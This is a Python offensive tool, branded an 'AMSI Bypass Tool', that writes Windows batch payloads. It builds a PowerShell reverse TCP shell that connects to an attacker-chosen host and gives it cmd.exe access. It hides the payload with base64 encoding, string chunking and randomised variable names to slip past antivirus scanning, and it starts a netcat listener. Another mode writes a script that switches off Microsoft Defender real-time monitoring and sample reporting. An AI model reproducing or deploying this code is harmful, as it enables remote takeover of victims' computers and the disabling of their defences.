from urllib.request import urlretrieve
import argparse as ap
import string as st
import platform
import hashlib
import os.path
import base64
import socket
import shutil
import random
import sys
import re
import os


banner = """
\x1B[3m\033[1mCopyright LukeProducts 2022, all rights reserved\x1B[0m
 ┌──────────────────────────────────────┐
 │                   ▼         ##       │
 │ ┌─────────────────┘    ┌────##───┐   │
 │ │AMSI Bypass Tool      │    ##   │   │
 │ └──────────────────────┘    ##   └─► │
 │                             ##       │
 │ \033[4m© Copyright by LukeProducts\033[0m ##       │
 └──────────────────────────────────────┘

""" 

"""
EDITING ZONE|
            ▼
"""
CHUNK_PROBABILITY = 0.01
VAR_ENCODING = "md5"

CHECK_HOST_REACHABLE = True # checks, if the host machine is reachable, can be set to False to speed up compiling process

"""
END OF EDITING ZONE
"""

chunk_count = 0

class UnkownHostOS(Exception):
    def __init__(self, ops,  errmessage = "The Host provides unsupported OS"): self.ops = ops; self.err = errmessage
    def __str__(self): return self.err + f" \"{self.ops}\""
def arg_init():
    app = ap.ArgumentParser()
    app.add_argument("-s", "--shelloutname", required=False, help = "Reverse Shell.  Value: fileoutputname. Requires: [-lh] [-lp], optional: [-b64] [-ch] [-v]")
    app.add_argument("-avkill", "--antiviruskill", required = False, help = "script to deactivate AV of victim if executed with admin privileges. Optional flag: [-b64] [-ch]")
    app.add_argument("-lh", "--localhost", required=False, help = "host for payload (\"lh\" for automatically assign host to this systems address)")
    app.add_argument("-ph", "--payloadhost", required=False, help = "host to connect to")
    app.add_argument("-pp", "--payloadport", required=False, help = "port to to connect to")
    app.add_argument("-lstp", "--listenport", required=False, help = "port to listen on with netcat")
    app.add_argument("-lp", "--localport", required=False, help = "port for payload (4 digit number recommended)")
    app.add_argument("-b64", action = "store_true", help = "encodes payload to base64")
    app.add_argument("-ch", action = "store_true", required=False, help = "chunks up base64 encoded string (chunking probability in CHUNK_PROBABILITY)")
    app.add_argument("-v", "--varencode", action = "store_true", required=False, help = "changes all variables names to an random 10 hex digit encoded into VAR_ENCODING encoding type (default is md5)")
    return vars(app.parse_args()), app

def encode_vars(string: str = "", encoding = VAR_ENCODING):
    matches = list(dict.fromkeys([i for i in re.findall("(\$\w*)", string) if i.lower() not in ["$null", "$true", "$false"] and len(i) > 1]))
    for match in matches: string = string.replace(match, "$" + hashlib.new(encoding, "".join([random.choice(st.hexdigits) for i in range(10)]).encode()).hexdigest())
    return string

def this_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ret = s.getsockname()[0]
    s.close()
    return ret

def chunk_up(prob:float = CHUNK_PROBABILITY, string: str = "", sep: str = "'"):
    global chunk_count
    res = ""
    for char in string: 
        res+=char
        if random.random() < prob and char != sep: res+=sep + " "*random.randint(0, int(prob*10)) + "+" + " "*random.randint(0, int(prob*10)) + sep;chunk_count += 1
    return res

def validateip(ip: str):
    if not all([ip.count(".") == 3, all([int(chunk if chunk else 1000) < 256 for chunk in ip.split(".")])]): print("Invalid IP address \"" + ip + "\"!");exit(-1)
    if CHECK_HOST_REACHABLE:
        try:host = socket.gethostbyaddr(ip);return f"\rHost set to \"{host[0]}\" ({host[2][0]})"
        except socket.herror: print("[!] Critical: IP address not reachable!"); return False

def getwinnc(): urlretrieve("https://github.com/int0x33/nc.exe/raw/master/nc.exe", "nc.exe") # if the windows user has netcat not installed, well download it for listener setup

def escinit():
    if os.name == 'nt':from ctypes import windll;k = windll.kernel32;k.SetConsoleMode(k.GetStdHandle(-11), 7) # enabling special escape sequences if run under windows    

def validateport(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.01)
    try:
        res = not s.connect_ex(("127.0.0.1", int(port))) == 0
    except OverflowError as ovf:
        print("[!] Port must be between 0 and 65535!")
        exit(-1)
    s.close()
    if not res: 
            try:
                service = socket.getservbyport(int(port), 'tcp')
            except OSError as ret:
                print(f"[!] Port {port} is not available!")
                exit(-1)
            print(f"[!] Port {port} is not available and already running {service} service!");exit(-1)

def encodebase64(string):
    return base64.b64encode(string.encode("utf_16_le")).decode()

def shell_tcp(host, port, encode = False, chunk = False, varencode = False):
    top = f"powershell /w 1 /{'e' if not chunk and encode else ''}C \"" if not chunk else """powershell /w 1 /C \"$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('"""
    body = "function cleanup {if ($client.Connected -eq $true) {$client.Close();}if ($process.ExitCode -ne $null) {$process.Close();}exit;}$address = '" + host +"';$port = '" + port + "';$client = New-Object system.net.sockets.tcpclient;$client.connect($address,$port);$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize;$process = New-Object System.Diagnostics.Process;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe';$process.StartInfo.RedirectStandardInput = 1;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0;$process.Start();$inputstream = $process.StandardInput;$outputstream = $process.StandardOutput;Start-Sleep 1;$encoding = new-object System.Text.AsciiEncoding;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read());}$stream.Write($encoding.GetBytes($out),0,$out.Length);$out = $null; $done = $false; $testing = 0;while (-not $done) {if ($client.Connected -ne $true) {cleanup;}$pos = 0; $i = 1;while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break;}}if ($pos -gt 0) {$string = $encoding.GetString($networkbuffer,0,$pos);$inputstream.write($string);start-sleep 1;if ($process.ExitCode -ne $null) {cleanup;}else {$out = $encoding.GetString($outputstream.Read());while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = '';}}$stream.Write($encoding.GetBytes($out),0,$out.length);$out = $null;$string = $null;}} else {cleanup;}}"
    finish = "\"" if  not chunk else """')));Invoke-Command -ScriptBlock $a\""""
    if varencode: body = encode_vars(string = body)
    if encode:
        body = encodebase64(body)
    if chunk and encode:
        body = chunk_up(string = body)
    return top + body + finish

def get_payload(name: str = "shell.bat", host = this_ip(), payloadhost=this_ip(), payloadport="4444", port = "4444", encode = False, chunk = False, varencode = False):
        global chunk_count
        if chunk and not encode: print("[!] chunking only makes sense with encoding to base64 and will be terminated. make sure you set -b64 flag too to do so");chunk = False
        print("Please wait while the shellcode is being created, this may take a few seconds...")
        sys.stdout.write("\033[F");sys.stdout.write("\033[K")
        hv = validateip(host)
        if hv: print(hv)
        validateport(port)
        open((name if name.endswith(".bat") else name + ".bat"), "w").write(shell_tcp(payloadhost, payloadport, encode=encode, chunk=chunk, varencode=varencode))
        print("\r")
        print(f"[*] Successfully exported payload to \"{name if name.endswith('.bat') else name + '.bat'}\"" + (" with encoding base64" if encode else "") + (" and chunked up " + str(chunk_count) + " times!" if chunk else "!"))
        
        if shutil.which("nc") != None:
            os.system(f"nc -nlvp {port}") # windows: https://joncraton.org/blog/46/netcat-for-windows/ , linux: "sudo apt-get install netcat"
        elif platform.system().lower() == "windows": getwinnc();os.system(f"nc -nlvp {port}") # install and use netcat
        else: print("[!] Netcat seems not to be installed...\n" + "[->] type \"sudo apt-get install netcat\" to install it")

def get_avkill(name :str = "", encode = False, chunk = False):
    open(name if name.endswith('.bat') else name + '.bat', "w").write(('powershell /w 1 /C "$user = [Security.Principal.WindowsIdentity]::GetCurrent(); if ((New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -SubmitSamplesConsent NeverSend;Set-MpPreference -MAPSReporting Disable;}"' 
        if not encode else ('powershell /w 1 /eC "' + encodebase64("$user = [Security.Principal.WindowsIdentity]::GetCurrent(); if ((New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -SubmitSamplesConsent NeverSend;Set-MpPreference -MAPSReporting Disable;}") +'"' 
        if not chunk else """powershell /w 1 /C \"$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('""" + chunk_up(string = encodebase64('$user = [Security.Principal.WindowsIdentity]::GetCurrent(); if ((New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -SubmitSamplesConsent NeverSend;Set-MpPreference -MAPSReporting Disable;}')) + "')));Invoke-Command -ScriptBlock $a\"")))
    print(f"[*] Successfully exported AV killer to \"{name if name.endswith('.bat') else name + '.bat'}\"" + (" with encoding base64" if encode else ""))



if __name__ == "__main__":
    try:
        escinit()
        print(banner)
        if platform.system().lower() not in ["windows", "linux"]: raise UnkownHostOS(platform.system())
        args, handle = arg_init()
        if not any(args.values()): handle.print_help()
        if args["shelloutname"] and args["localhost"] != None and args["localport"] != None: get_payload(name = args["shelloutname"], host = (args["localhost"] if args["localhost"] != "lh" else this_ip()), payloadhost = (args["payloadhost"] if args["payloadhost"] != None else this_ip()), payloadport = (args["payloadport"] if args["payloadport"] != None else "4444"), port = args["localport"], encode = args["b64"], chunk = args["ch"], varencode = args["varencode"])
        elif args["antiviruskill"]: get_avkill(args["antiviruskill"], encode = args["b64"], chunk = args["ch"])
        else: 
            if not len(sys.argv) < 2:print("You've not entered an valid command!")
    except KeyboardInterrupt: print("\n[*] Aborting..."); exit(-1)
